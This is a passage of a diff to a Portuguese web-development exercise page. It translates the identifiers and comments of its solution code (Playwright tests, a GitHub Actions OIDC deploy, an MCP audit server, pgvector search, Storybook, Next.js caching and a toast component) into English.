             <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>Seria mais seguro no papel e menos na prática: confirmação pra tudo treina o usuário a clicar &ldquo;sim&rdquo; sem ler. Aprovação entra onde a ação é irreversível, custa dinheiro ou fala em nome do usuário, e de preferência por regra dinâmica (reserva acima de um valor, e-mail pra fora da empresa). Buscar voos é leitura: roda direto.</p></div></details>
@@ -823,28 +823,28 @@ function Reserva({ part, voo, onAprovar }: {
 <pre><code>import { test, expect } from '@playwright/test';
 import AxeBuilder from '@axe-core/playwright';
 
-// monta o corpo SSE que o endpoint real devolveria
+// builds the SSE body the real endpoint would return
 const sse = (...deltas: string[]) =&gt;
   deltas.map((d) =&gt; `data: ${JSON.stringify({ delta: d })}\n\n`).join('') + 'data: [DONE]\n\n';
 
-const resposta = (body: string) =&gt; ({
+const response = (body: string) =&gt; ({
   status: 200,
   headers: { 'content-type': 'text/event-stream' },
   body,
 });
 
-test('mostra a resposta e não tem violação de acessibilidade', async ({ page }) =&gt; {
+test('shows the answer and has no accessibility violations', async ({ page }) =&gt; {
   await page.route('**/api/chat', (route) =&gt;
-    route.fulfill(resposta(sse('Nonce é ', 'um valor ', 'por request.'))),
+    route.fulfill(response(sse('Nonce é ', 'um valor ', 'por request.'))),
   );
   await page.goto('/chat');
 
   await page.getByLabel('Sua pergunta').fill('O que é nonce?');
   await page.getByRole('button', { name: 'Enviar' }).click();
 
-  // espera pelo resultado, nunca por tempo
+  // wait for the result, never for a fixed time
   await expect(page.getByText('Nonce é um valor por request.')).toBeVisible();
-  await expect(page.getByRole('button', { name: 'Enviar' })).toBeVisible(); // voltou ao estado "ready"
+  await expect(page.getByRole('button', { name: 'Enviar' })).toBeVisible(); // back to "ready"
 
   const axe = await new AxeBuilder({ page })
     .withTags(['wcag2a', 'wcag2aa', 'wcag21a', 'wcag21aa'])
@@ -852,23 +852,23 @@ test('mostra a resposta e não tem violação de acessibilidade', async ({ page 
   expect(axe.violations).toEqual([]);
 });
 
-test('503 mostra "Tentar de novo" e a segunda tentativa funciona', async ({ page }) =&gt; {
-  let chamadas = 0;
+test('503 shows "Tentar de novo" and the second attempt works', async ({ page }) =&gt; {
+  let calls = 0;
   await page.route('**/api/chat', (route) =&gt; {
-    chamadas += 1;
-    return chamadas === 1
-      ? route.fulfill({ status: 503, body: 'indisponível' })
-      : route.fulfill(resposta(sse('Pronto.')));
+    calls += 1;
+    return calls === 1
+      ? route.fulfill({ status: 503, body: 'unavailable' })
+      : route.fulfill(response(sse('Pronto.')));
   });
   await page.goto('/chat');
   await page.getByLabel('Sua pergunta').fill('Oi');
   await page.getByRole('button', { name: 'Enviar' }).click();
 
-  await expect(page.getByRole('alert')).toContainText('Falha HTTP 503');
+  await expect(page.getByRole('alert')).toContainText('HTTP error 503');
   await page.getByRole('button', { name: 'Tentar de novo' }).click();
 
   await expect(page.getByText('Pronto.')).toBeVisible();
-  expect(chamadas).toBe(2); // o retry foi uma segunda requisição de verdade
+  expect(calls).toBe(2); // the retry was a real second request
 });
 </code></pre>
 <h5>Configuração mínima</h5>
@@ -923,7 +923,7 @@ export default defineConfig({
         <li>Se sabe o que <code>concurrency</code> e <code>needs</code> fazem, e onde o <code>cancel-in-progress</code> é perigoso.</li>
         <li>Se a trust policy tem a condição <code>sub</code>: sem ela, qualquer repositório com o mesmo provider poderia tentar assumir a role.</li>
       </ul>
-      <details class="dica"><summary>dica 1</summary><div class="dica-body"><p>Dois jobs: <code>qualidade</code> (roda em PR e em push) e <code>deploy</code> com <code>needs: qualidade</code> e um <code>if</code> que exige push na main. O token OIDC só é pedido no segundo.</p></div></details>
+      <details class="dica"><summary>dica 1</summary><div class="dica-body"><p>Dois jobs: <code>quality</code> (roda em PR e em push) e <code>deploy</code> com <code>needs: quality</code> e um <code>if</code> que exige push na main. O token OIDC só é pedido no segundo.</p></div></details>
       <details class="dica"><summary>dica 2</summary><div class="dica-body"><p>O container do Postgres demora a aceitar conexão. O <code>options</code> do service com <code>--health-cmd pg_isready</code> faz o GitHub esperar ele ficar saudável antes de iniciar os passos.</p></div></details>
       <details class="dica"><summary>dica 3</summary><div class="dica-body"><p>Pra role: um provider de identidade pra <code>token.actions.githubusercontent.com</code> no IAM, e uma trust policy com <code>sts:AssumeRoleWithWebIdentity</code>, <code>aud</code> igual a <code>sts.amazonaws.com</code> e <code>sub</code> igual a <code>repo:ORG/REPO:ref:refs/heads/main</code>.</p></div></details>
       <details class="sol"><summary>solução comentada</summary><div class="sol-body">
@@ -932,14 +932,14 @@ on:
   pull_request:
   push: { branches: [main] }
 
-concurrency:                       # push novo no mesmo PR cancela a execução anterior
+concurrency:                       # a new push to the same PR cancels the previous run
   group: ci-${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
 
-permissions: { contents: read }    # o mínimo pra todo job
+permissions: { contents: read }    # the minimum for every job
 
 jobs:
-  qualidade:
+  quality:
     runs-on: ubuntu-latest
     timeout-minutes: 15
     services:
@@ -961,17 +961,17 @@ jobs:
       - run: pnpm turbo lint typecheck test build
 
   deploy:
-    needs: qualidade
+    needs: quality
     if: github.event_name == 'push' &amp;&amp; github.ref == 'refs/heads/main'
     runs-on: ubuntu-latest
-    permissions: { id-token: write, contents: read }   # só aqui o OIDC
+    permissions: { id-token: write, contents: read }   # OIDC only here
     steps:
       - uses: actions/checkout@v4
       - uses: aws-actions/configure-aws-credentials@v4
         with:
           role-to-assume: arn:aws:iam::123456789012:role/deploy-web
           aws-region: eu-west-1
-      - run: ./scripts/deploy.sh   # build da imagem, push pro ECR, atualiza o serviço
+      - run: ./scripts/deploy.sh   # builds the image, pushes to ECR, updates the service
 </code></pre>
 <h5>A trust policy da role</h5>
 <pre><code>{
@@ -1034,8 +1034,8 @@ jobs:
 <pre><code>import { McpServer } from '@modelcontextprotocol/server';
 import { StdioServerTransport } from '@modelcontextprotocol/server/stdio';
 import { z } from 'zod';
-import { runAudit } from './audit';         // seu código: Puppeteer + axe-core
-import { urlPermitida } from './url-guard'; // bloqueia localhost, IP privado e link-local
+import { runAudit } from './audit';           // your code: Puppeteer + axe-core
+import { isUrlAllowed } from './url-guard';   // blocks localhost, private IPs and link-local
 
 const server = new McpServer({ name: 'ally-audit', version: '0.1.0' });
 
@@ -1043,31 +1043,31 @@ server.registerTool(
   'audit_url',
   {
     description:
-      'Audita a acessibilidade (WCAG 2.1) de uma página pública com axe-core e devolve ' +
-      'as violações, da mais grave para a menos grave. Use quando o usuário pedir pra ' +
-      'checar uma página. Não use para páginas que exigem login.',
+      'Audits the accessibility (WCAG 2.1) of a public page with axe-core and returns ' +
+      'the violations, most severe first. Use it when the user asks to check a page. ' +
+      'Do not use it for pages that require login.',
     inputSchema: z.object({
-      url: z.string().url().describe('URL pública, começando com https://'),
+      url: z.string().url().describe('Public URL, starting with https://'),
     }),
   },
   async ({ url }) =&gt; {
-    if (!(await urlPermitida(url))) {
+    if (!(await isUrlAllowed(url))) {
       return {
         isError: true,
-        content: [{ type: 'text', text: 'URL não permitida (interna ou inválida). Informe uma URL pública.' }],
+        content: [{ type: 'text', text: 'URL not allowed (internal or invalid). Provide a public URL.' }],
       };
     }
-    const violacoes = await runAudit(url);
-    const maisGraves = violacoes.slice(0, 20); // o resultado volta pro contexto: tamanho tem teto
+    const violations = await runAudit(url);
+    const worst = violations.slice(0, 20); // the result goes back into the context: cap its size
     return {
-      content: [{ type: 'text', text: JSON.stringify(maisGraves, null, 2) }],
+      content: [{ type: 'text', text: JSON.stringify(worst, null, 2) }],
     };
   },
 );
 
 async function main() {
   await server.connect(new StdioServerTransport());
-  console.error('ally-audit rodando em stdio'); // stderr: stdout é o protocolo
+  console.error('ally-audit running on stdio'); // stderr: stdout is the protocol
 }
 main().catch((e) =&gt; {
   console.error(e);
@@ -1125,7 +1125,7 @@ CREATE EXTENSION IF NOT EXISTS vector;
 
 ALTER TABLE questions
   ADD COLUMN embedding vector(768),
-  ADD COLUMN embedding_model text;       -- o vetor só vale pra comparar com o MESMO modelo
+  ADD COLUMN embedding_model text;       -- a vector is only comparable with the SAME model
 
 CREATE INDEX questions_embedding_hnsw
   ON questions USING hnsw (embedding vector_cosine_ops);
@@ -1136,24 +1136,24 @@ import type { Pool } from 'pg';
 import pgvector from 'pgvector';
 
 const ai = new GoogleGenAI({ apiKey: process.env.GEMINI_API_KEY });
-const MODELO = 'gemini-embedding-001';
+const MODEL = 'gemini-embedding-001';
 
-async function embute(texto: string, tarefa: 'RETRIEVAL_DOCUMENT' | 'RETRIEVAL_QUERY') {
+async function embed(text: string, taskType: 'RETRIEVAL_DOCUMENT' | 'RETRIEVAL_QUERY') {
   const res = await ai.models.embedContent({
-    model: MODELO,
-    contents: texto,
-    config: { outputDimensionality: 768, taskType: tarefa },
+    model: MODEL,
+    contents: text,
+    config: { outputDimensionality: 768, taskType },
   });
-  const valores = res.embeddings?.[0]?.values;
-  if (!valores) throw new Error('embedding vazio');
-  return valores;
+  const values = res.embeddings?.[0]?.values;
+  if (!values) throw new Error('empty embedding');
+  return values;
 }
 
-export async function indexaQuestao(db: Pool, id: number, enunciado: string) {
-  const v = await embute(enunciado, 'RETRIEVAL_DOCUMENT');
+export async function indexQuestion(db: Pool, id: number, stem: string) {
+  const v = await embed(stem, 'RETRIEVAL_DOCUMENT');
   await db.query(
     'UPDATE questions SET embedding = $1::vector, embedding_model = $2 WHERE id = $3',
-    [pgvector.toSql(v), MODELO, id],
+    [pgvector.toSql(v), MODEL, id],
   );
 }
 </code></pre>
@@ -1164,16 +1164,16 @@ import { db } from '@/lib/db';
 
 export async function GET(req: Request) {
   const id = Number(new URL(req.url).searchParams.get('id'));
-  if (!Number.isInteger(id)) return NextResponse.json({ erro: 'id inválido' }, { status: 400 });
+  if (!Number.isInteger(id)) return NextResponse.json({ error: 'invalid id' }, { status: 400 });
 
-  const cliente = await db.connect();
+  const client = await db.connect();
   try {
-    await cliente.query('BEGIN');
-    // com filtro, o scan do índice pode trazer menos linhas que o LIMIT: continua até completar
-    await cliente.query("SET LOCAL hnsw.iterative_scan = 'relaxed_order'");
-    const { rows } = await cliente.query(
+    await client.query('BEGIN');
+    // with a filter, the index scan may return fewer rows than the LIMIT: keep going until full
+    await client.query("SET LOCAL hnsw.iterative_scan = 'relaxed_order'");
+    const { rows } = await client.query(
       `SELECT id, stem,
-              1 - (embedding &lt;=&gt; (SELECT embedding FROM questions WHERE id = $1)) AS similaridade
+              1 - (embedding &lt;=&gt; (SELECT embedding FROM questions WHERE id = $1)) AS similarity
          FROM questions
         WHERE id &lt;&gt; $1
           AND specialty = (SELECT specialty FROM questions WHERE id = $1)
@@ -1182,10 +1182,10 @@ export async function GET(req: Request) {
         LIMIT 5`,
       [id],
     );
-    await cliente.query('COMMIT');
+    await client.query('COMMIT');
     return NextResponse.json(rows);
   } finally {
-    cliente.release();
+    client.release();
   }
 }
 </code></pre>
@@ -1232,43 +1232,43 @@ export async function GET(req: Request) {
 <pre><code>import type { Meta, StoryObj } from '@storybook/react-vite';
 import { expect, fn } from 'storybook/test';
 import { Button } from './button';
-import { IconeLixeira } from '../icons';
+import { TrashIcon } from '../icons';
 
 const meta = {
   title: 'Design System/Button',
   component: Button,
-  tags: ['autodocs'],                       // documentação gerada dos tipos e das stories
+  tags: ['autodocs'],                       // docs generated from the types and the stories
   parameters: {
-    a11y: { test: 'error' },                // violação de acessibilidade REPROVA o teste
+    a11y: { test: 'error' },                // an accessibility violation FAILS the test
   },
   args: { children: 'Salvar', onClick: fn() },
 } satisfies Meta&lt;typeof Button&gt;;
 export default meta;
 type Story = StoryObj&lt;typeof meta&gt;;
 
-export const Primario: Story = {};
-export const Secundario: Story = { args: { intent: 'secondary' } };
-export const Perigo: Story = { args: { intent: 'danger', children: 'Excluir' } };
-export const Pequeno: Story = { args: { size: 'sm' } };
+export const Primary: Story = {};
+export const Secondary: Story = { args: { intent: 'secondary' } };
+export const Danger: Story = { args: { intent: 'danger', children: 'Excluir' } };
+export const Small: Story = { args: { size: 'sm' } };
 
-export const SoIcone: Story = {
-  args: { children: undefined, icon: &lt;IconeLixeira /&gt;, 'aria-label': 'Excluir questão', intent: 'ghost' },
+export const IconOnly: Story = {
+  args: { children: undefined, icon: &lt;TrashIcon /&gt;, 'aria-label': 'Excluir questão', intent: 'ghost' },
 };
 
-export const Carregando: Story = {
+export const Loading: Story = {
   args: { loading: true },
   play: async ({ canvas, args, userEvent }) =&gt; {
-    const botao = canvas.getByRole('button', { name: 'Salvar' });
-    await userEvent.click(botao);
-    await expect(args.onClick).not.toHaveBeenCalled();          // clique ignorado
-    botao.focus();
-    await expect(botao).toHaveFocus();                          // continua focável
-    await expect(botao).toHaveAttribute('aria-busy', 'true');
+    const button = canvas.getByRole('button', { name: 'Salvar' });
+    await userEvent.click(button);
+    await expect(args.onClick).not.toHaveBeenCalled();          // click ignored
+    button.focus();
+    await expect(button).toHaveFocus();                         // still focusable
+    await expect(button).toHaveAttribute('aria-busy', 'true');
   },
 };
 
-// mesma story no tema escuro: o decorator só troca o atributo que os tokens leem
-export const PrimarioEscuro: Story = {
+// same story in the dark theme: the decorator only changes the attribute the tokens read
+export const PrimaryDark: Story = {
   decorators: [
     (Story) =&gt; (
       &lt;div data-theme="dark" style={{ padding: 16, background: 'var(--paper)' }}&gt;
@@ -1305,28 +1305,28 @@ export const PrimarioEscuro: Story = {
 <pre><code>'use client';
 import { useEffect, useState } from 'react';
 
-export default function QuestoesPage() {
-  const [questoes, setQuestoes] = useState&lt;Questao[] | null&gt;(null);
+export default function QuestionsPage() {
+  const [questions, setQuestions] = useState&lt;Question[] | null&gt;(null);
   const [stats, setStats] = useState&lt;Stats | null&gt;(null);
-  const [erro, setErro] = useState(false);
-  const [esp, setEsp] = useState('todas');
+  const [error, setError] = useState(false);
+  const [specialty, setSpecialty] = useState('all');
 
   useEffect(() =&gt; {
     (async () =&gt; {
       try {
-        const q = await fetch(`/api/questoes?esp=${esp}`).then((r) =&gt; r.json());
-        const s = await fetch('/api/minhas-estatisticas').then((r) =&gt; r.json()); // espera a de cima
-        setQuestoes(q);
+        const q = await fetch(`/api/questions?specialty=${specialty}`).then((r) =&gt; r.json());
+        const s = await fetch('/api/my-stats').then((r) =&gt; r.json()); // waits for the one above
+        setQuestions(q);
         setStats(s);
       } catch {
-        setErro(true);
+        setError(true);
       }
     })();
-  }, [esp]);
+  }, [specialty]);
 
-  if (erro) return &lt;p&gt;Erro&lt;/p&gt;;
-  if (!questoes || !stats) return &lt;p&gt;Carregando…&lt;/p&gt;;
-  return &lt;Lista questoes={questoes} stats={stats} onFiltro={setEsp} esp={esp} /&gt;;
+  if (error) return &lt;p&gt;Erro&lt;/p&gt;;
+  if (!questions || !stats) return &lt;p&gt;Carregando…&lt;/p&gt;;
+  return &lt;List questions={questions} stats={stats} onFilter={setSpecialty} specialty={specialty} /&gt;;
 }
 </code></pre>
       <h4>Requisitos que você deve levantar</h4>
@@ -1345,65 +1345,65 @@ export default function QuestoesPage() {
       <details class="dica"><summary>dica 1</summary><div class="dica-body"><p>No Next 16 com <code>cacheComponents: true</code>, <strong>nada é cacheado por padrão</strong>. Você marca a função com <code>'use cache'</code> e define <code>cacheLife</code> e <code>cacheTag</code>. Dado que depende de <code>cookies()</code> ou <code>searchParams</code> é dinâmico e precisa estar atrás de um <code>Suspense</code>.</p></div></details>
       <details class="dica"><summary>dica 2</summary><div class="dica-body"><p>A página pode receber <code>searchParams</code> como <em>promessa</em> e repassá-la a um componente que a resolve lá dentro, atrás do <code>Suspense</code>. Assim a casca (título e esqueleto) é estática e sai na hora.</p></div></details>
       <details class="sol"><summary>solução comentada</summary><div class="sol-body">
-<pre><code>// app/questoes/page.tsx  (Server Component: nada de 'use client')
+<pre><code>// app/questions/page.tsx  (Server Component: no 'use client')
 import { Suspense } from 'react';
-import { Filtro } from './filtro';
-import { listarQuestoes, estatisticasDoUsuario } from '@/lib/questoes';
+import { Filter } from './filter';
+import { listQuestions, getUserStats } from '@/lib/questions';
 
-export default function QuestoesPage({
+export default function QuestionsPage({
   searchParams,
 }: {
-  searchParams: Promise&lt;{ esp?: string }&gt;;
+  searchParams: Promise&lt;{ specialty?: string }&gt;;
 }) {
   return (
     &lt;&gt;
-      &lt;h1&gt;Questões&lt;/h1&gt;                         {/* casca estática: sai na hora */}
-      &lt;Suspense fallback={&lt;ListaSkeleton /&gt;}&gt;
-        &lt;Conteudo searchParams={searchParams} /&gt;
+      &lt;h1&gt;Questões&lt;/h1&gt;                         {/* static shell: goes out right away */}
+      &lt;Suspense fallback={&lt;ListSkeleton /&gt;}&gt;
+        &lt;Content searchParams={searchParams} /&gt;
       &lt;/Suspense&gt;
     &lt;/&gt;
   );
 }
 
-async function Conteudo({ searchParams }: { searchParams: Promise&lt;{ esp?: string }&gt; }) {
-  const { esp = 'todas' } = await searchParams;
-  // independentes: em paralelo, não em fila
-  const [questoes, stats] = await Promise.all([listarQuestoes(esp), estatisticasDoUsuario()]);
+async function Content({ searchParams }: { searchParams: Promise&lt;{ specialty?: string }&gt; }) {
+  const { specialty = 'all' } = await searchParams;
+  // independent: in parallel, not one after the other
+  const [questions, stats] = await Promise.all([listQuestions(specialty), getUserStats()]);
   return (
     &lt;&gt;
-      &lt;Filtro atual={esp} /&gt;
-      &lt;Lista questoes={questoes} stats={stats} /&gt;
+      &lt;Filter current={specialty} /&gt;
+      &lt;List questions={questions} stats={stats} /&gt;
     &lt;/&gt;
   );
 }
 </code></pre>
-<pre><code>// lib/questoes.ts
+<pre><code>// lib/questions.ts
 import { cacheLife, cacheTag } from 'next/cache';
 import { cookies } from 'next/headers';
 
-export async function listarQuestoes(esp: string) {
-  'use cache';                 // dado COMPARTILHADO: pode ficar em cache
+export async function listQuestions(specialty: string) {
+  'use cache';                 // SHARED data: can be cached
   cacheLife('minutes');
-  cacheTag('questoes');        // uma Server Action invalida por esta tag quando editar uma questão
-  return db.questao.findMany({ where: esp === 'todas' ? {} : { especialidade: esp } });
+  cacheTag('questions');       // a Server Action invalidates this tag when a question is edited
+  return db.question.findMany({ where: specialty === 'all' ? {} : { specialty } });
 }
 
-export async function estatisticasDoUsuario() {
-  // sem 'use cache': depende da sessão (cookies), então é dinâmico e fica atrás do Suspense
-  const sessao = (await cookies()).get('sessao')?.value;
-  return db.estatisticas.porSessao(sessao);
+export async function getUserStats() {
+  // no 'use cache': it depends on the session (cookies), so it is dynamic and sits behind Suspense
+  const session = (await cookies()).get('session')?.value;
+  return db.stats.bySession(session);
 }
 </code></pre>
-<pre><code>// app/questoes/filtro.tsx: a única ilha de cliente, porque precisa de evento
+<pre><code>// app/questions/filter.tsx: the only client island, because it needs an event
 'use client';
 import { useRouter } from 'next/navigation';
 
-export function Filtro({ atual }: { atual: string }) {
+export function Filter({ current }: { current: string }) {
   const router = useRouter();
   return (
-    &lt;select aria-label="Especialidade" value={atual} onChange={(e) =&gt; router.push(`?esp=${e.target.value}`)}&gt;
-      &lt;option value="todas"&gt;Todas&lt;/option&gt;
-      &lt;option value="pediatria"&gt;Pediatria&lt;/option&gt;
+    &lt;select aria-label="Especialidade" value={current} onChange={(e) =&gt; router.push(`?specialty=${e.target.value}`)}&gt;
+      &lt;option value="all"&gt;Todas&lt;/option&gt;
+      &lt;option value="pediatrics"&gt;Pediatria&lt;/option&gt;
     &lt;/select&gt;
   );
 }
@@ -1417,7 +1417,7 @@ export function Filtro({ atual }: { atual: string }) {
             <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>Quase nunca <em>pra carga inicial</em>. Ainda faz sentido buscar no cliente quando o dado depende de interação contínua ou de algo que só existe no navegador (posição do mouse, tamanho da janela, um pedido que o usuário dispara a cada tecla), e aí o ideal é uma biblioteca de dados de servidor no cliente (TanStack Query), que cuida de cache, deduplicação, refetch e erro, em vez de efeito escrito à mão. O que sai do <code>useEffect</code> é a carga inicial da página.</p></div></details>
           </li>
           <li>Como a lista em cache é atualizada quando alguém edita uma questão?
-            <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>Pela <strong>tag</strong>: a Server Action que grava a edição chama <code>revalidateTag('questoes', 'max')</code> (que marca como velho e serve o antigo enquanto regenera) ou <code>updateTag</code> (quando a própria pessoa precisa ver a mudança na hora). O <code>cacheLife</code> é o teto de segurança, a tag é a invalidação precisa. Em várias instâncias, o cache tem que ser compartilhado, senão cada uma invalida só a sua (ver <a href="r05-cloud-aws.html">R5</a>).</p></div></details>
+            <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>Pela <strong>tag</strong>: a Server Action que grava a edição chama <code>revalidateTag('questions', 'max')</code> (que marca como velho e serve o antigo enquanto regenera) ou <code>updateTag</code> (quando a própria pessoa precisa ver a mudança na hora). O <code>cacheLife</code> é o teto de segurança, a tag é a invalidação precisa. Em várias instâncias, o cache tem que ser compartilhado, senão cada uma invalida só a sua (ver <a href="r05-cloud-aws.html">R5</a>).</p></div></details>
           </li>
           <li>O que acontece se eu acessar <code>cookies()</code> fora de um <code>Suspense</code>?
             <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>Com Cache Components ligado, o Next recusa em tempo de build: dado dinâmico fora de uma fronteira <code>Suspense</code> obriga você a decidir. Ou o dado é cacheado, ou existe um fallback pra mostrar enquanto ele chega. O efeito é o <strong>PPR por padrão</strong>: casca estática pré-renderizada e buracos dinâmicos preenchidos no request.</p></div></details>
@@ -1463,90 +1463,90 @@ export function Filtro({ atual }: { atual: string }) {
 
 export type Toast = {
   id: string;
-  tipo: 'info' | 'erro';
-  titulo: string;
-  descricao?: string;
-  desfazer?: () =&gt; void;
-  saindo?: boolean;
+  kind: 'info' | 'error';
+  title: string;
+  description?: string;
+  undo?: () =&gt; void;
+  leaving?: boolean;
 };
 
 export function useToasts() {
   const [toasts, setToasts] = useState&lt;Toast[]&gt;([]);
-  const mostrar = useCallback((t: Omit&lt;Toast, 'id' | 'saindo'&gt;) =&gt; {
+  const show = useCallback((t: Omit&lt;Toast, 'id' | 'leaving'&gt;) =&gt; {
     setToasts((ts) =&gt; [...ts, { ...t, id: crypto.randomUUID() }]);
   }, []);
-  const fechar = useCallback((id: string) =&gt; {          // 1º passo: marca pra animar a saída
-    setToasts((ts) =&gt; ts.map((t) =&gt; (t.id === id ? { ...t, saindo: true } : t)));
+  const dismiss = useCallback((id: string) =&gt; {          // step 1: mark it to animate out
+    setToasts((ts) =&gt; ts.map((t) =&gt; (t.id === id ? { ...t, leaving: true } : t)));
   }, []);
-  const remover = useCallback((id: string) =&gt; {          // 2º passo: tira do DOM
+  const remove = useCallback((id: string) =&gt; {           // step 2: take it out of the DOM
     setToasts((ts) =&gt; ts.filter((t) =&gt; t.id !== id));
   }, []);
-  return { toasts, mostrar, fechar, remover };
+  return { toasts, show, dismiss, remove };
 }
 
-export function Toaster({ toasts, fechar, remover }: {
-  toasts: Toast[]; fechar: (id: string) =&gt; void; remover: (id: string) =&gt; void;
+export function Toaster({ toasts, dismiss, remove }: {
+  toasts: Toast[]; dismiss: (id: string) =&gt; void; remove: (id: string) =&gt; void;
 }) {
-  const lista = (tipo: Toast['tipo']) =&gt;
-    toasts.filter((t) =&gt; t.tipo === tipo).map((t) =&gt; (
-      &lt;ToastItem key={t.id} toast={t} fechar={fechar} remover={remover} /&gt;
+  const list = (kind: Toast['kind']) =&gt;
+    toasts.filter((t) =&gt; t.kind === kind).map((t) =&gt; (
+      &lt;ToastItem key={t.id} toast={t} dismiss={dismiss} remove={remove} /&gt;
     ));
   return (
     &lt;section aria-label="Notificações" className="toasts"&gt;
-      {/* as duas regiões existem SEMPRE, vazias ou não: é isso que faz o anúncio funcionar */}
-      &lt;div role="status" className="toasts-lista"&gt;{lista('info')}&lt;/div&gt;
-      &lt;div role="alert" className="toasts-lista"&gt;{lista('erro')}&lt;/div&gt;
+      {/* both regions ALWAYS exist, empty or not: that is what makes the announcement work */}
+      &lt;div role="status" className="toasts-list"&gt;{list('info')}&lt;/div&gt;
+      &lt;div role="alert" className="toasts-list"&gt;{list('error')}&lt;/div&gt;
     &lt;/section&gt;
   );
 }
 
-function ToastItem({ toast, fechar, remover }: {
-  toast: Toast; fechar: (id: string) =&gt; void; remover: (id: string) =&gt; void;
+function ToastItem({ toast, dismiss, remove }: {
+  toast: Toast; dismiss: (id: string) =&gt; void; remove: (id: string) =&gt; void;
 }) {
-  const [pausado, setPausado] = useState(false);
-  const restante = useRef(5000);
-  const inicio = useRef(0);
+  const [paused, setPaused] = useState(false);
+  const remaining = useRef(5000);
+  const startedAt = useRef(0);
 
-  // contagem de 5 s que pausa em hover/foco e retoma de onde parou
+  // 5 s countdown that pauses on hover/focus and resumes where it stopped
   useEffect(() =&gt; {
-    if (pausado || toast.saindo) return;
-    inicio.current = Date.now();
-    const t = setTimeout(() =&gt; fechar(toast.id), restante.current);
+    if (paused || toast.leaving) return;
+    startedAt.current = Date.now();
+    const t = setTimeout(() =&gt; dismiss(toast.id), remaining.current);
     return () =&gt; {
       clearTimeout(t);
-      restante.current -= Date.now() - inicio.current;
+      remaining.current -= Date.now() - startedAt.current;
     };
-  }, [pausado, toast.saindo, toast.id, fechar]);
+  }, [paused, toast.leaving, toast.id, dismiss]);
 
-  // depois da animação de saída, remove; o timer de segurança cobre quem desligou animação
+  // after the exit animation, remove; the safety timer covers people who turned animations off
   useEffect(() =&gt; {
-    if (!toast.saindo) return;
-    const t = setTimeout(() =&gt; remover(toast.id), 400);
+    if (!toast.leaving) return;
+    const t = setTimeout(() =&gt; remove(toast.id), 400);
     return () =&gt; clearTimeout(t);
-  }, [toast.saindo, toast.id, remover]);
+  }, [toast.leaving, toast.id, remove]);
 
   return (
     &lt;div
       className="toast"
-      data-saindo={toast.saindo ? 'true' : 'false'}
-      onMouseEnter={() =&gt; setPausado(true)}
-      onMouseLeave={() =&gt; setPausado(false)}
-      onFocus={() =&gt; setPausado(true)}
-      onBlur={() =&gt; setPausado(false)}
-      onKeyDown={(e) =&gt; { if (e.key === 'Escape') fechar(toast.id); }}
-      onAnimationEnd={() =&gt; { if (toast.saindo) remover(toast.id); }}
+      data-leaving={toast.leaving ? 'true' : 'false'}
+      onMouseEnter={() =&gt; setPaused(true)}
+      onMouseLeave={() =&gt; setPaused(false)}
+      onFocus={() =&gt; setPaused(true)}
+      onBlur={() =&gt; setPaused(false)}
+      onKeyDown={(e) =&gt; { if (e.key === 'Escape') dismiss(toast.id); }}
+      onAnimationEnd={() =&gt; { if (toast.leaving) remove(toast.id); }}
     &gt;
-      &lt;span aria-hidden="true" className="toast-icone"&gt;{toast.tipo === 'erro' ? '!' : 'i'}&lt;/span&gt;
-      &lt;div className="toast-texto"&gt;
-        &lt;p className="toast-titulo"&gt;{toast.titulo}&lt;/p&gt;
-        {toast.descricao &amp;&amp; &lt;p className="toast-desc"&gt;{toast.descricao}&lt;/p&gt;}
+      &lt;span aria-hidden="true" className="toast-icon"&gt;{toast.kind === 'error' ? '!' : 'i'}&lt;/span&gt;
+      &lt;div className="toast-text"&gt;
+        &lt;p className="toast-title"&gt;{toast.title}&lt;/p&gt;
+        {toast.description &amp;&amp; &lt;p className="toast-desc"&gt;{toast.description}&lt;/p&gt;}
       &lt;/div&gt;
-      {toast.desfazer &amp;&amp; (
-        &lt;button type="button" className="toast-acao" onClick={() =&gt; { toast.desfazer?.(); fechar(toast.id); }}&gt;
+      {toast.undo &amp;&amp; (
+        &lt;button type="button" className="toast-action" onClick={() =&gt; { toast.undo?.(); dismiss(toast.id); }}&gt;
           Desfazer
         &lt;/button&gt;
       )}
-      &lt;button type="button" className="toast-fechar" aria-label="Fechar notificação" onClick={() =&gt; fechar(toast.id)}&gt;
+      &lt;button type="button" className="toast-close" aria-label="Fechar notificação" onClick={() =&gt; dismiss(toast.id)}&gt;
         &lt;span aria-hidden="true"&gt;&amp;times;&lt;/span&gt;
       &lt;/button&gt;
     &lt;/div&gt;
@@ -1558,7 +1558,7 @@ function ToastItem({ toast, fechar, remover }: {
   display: grid; gap: 8px;
   width: min(360px, calc(100vw - 32px));
 }
-.toasts-lista { display: grid; gap: 8px; }
+.toasts-list { display: grid; gap: 8px; }
 
 .toast {
   display: grid; grid-template-columns: 20px 1fr auto auto; column-gap: 12px; align-items: start;
@@ -1567,24 +1567,24 @@ function ToastItem({ toast, fechar, remover }: {
   box-shadow: var(--elevation-3);
   animation: toast-in 200ms ease-out both;
 }
-.toast[data-saindo='true'] { animation: toast-out 150ms ease-in both; }
+.toast[data-leaving='true'] { animation: toast-out 150ms ease-in both; }
 
-.toast-titulo { margin: 0; font: 600 14px/20px var(--font-sans); }
-.toast-desc   { margin: 0; font: 400 13px/18px var(--font-sans); opacity: .85; }
-.toast-acao, .toast-fechar {
+.toast-title { margin: 0; font: 600 14px/20px var(--font-sans); }
+.toast-desc  { margin: 0; font: 400 13px/18px var(--font-sans); opacity: .85; }
+.toast-action, .toast-close {
   min-height: 32px; min-width: 32px; border: 0; background: transparent; color: inherit; cursor: pointer;
   border-radius: 8px;
 }
-.toast-acao { font: 600 13px/18px var(--font-sans); padding: 0 8px; text-decoration: underline; }
-.toast-acao:focus-visible, .toast-fechar:focus-visible { outline: 2px solid currentColor; outline-offset: 2px; }
+.toast-action { font: 600 13px/18px var(--font-sans); padding: 0 8px; text-decoration: underline; }
+.toast-action:focus-visible, .toast-close:focus-visible { outline: 2px solid currentColor; outline-offset: 2px; }
 
 @keyframes toast-in  { from { opacity: 0; transform: translateY(16px); } }
 @keyframes toast-out { to   { opacity: 0; transform: translateY(8px); } }
 
-/* sem movimento: só o fade, que ainda comunica a entrada e a saída */
+/* no motion: just the fade, which still signals entering and leaving */
 @media (prefers-reduced-motion: reduce) {
   .toast { animation-name: toast-fade-in; }
-  .toast[data-saindo='true'] { animation-name: toast-fade-out; }
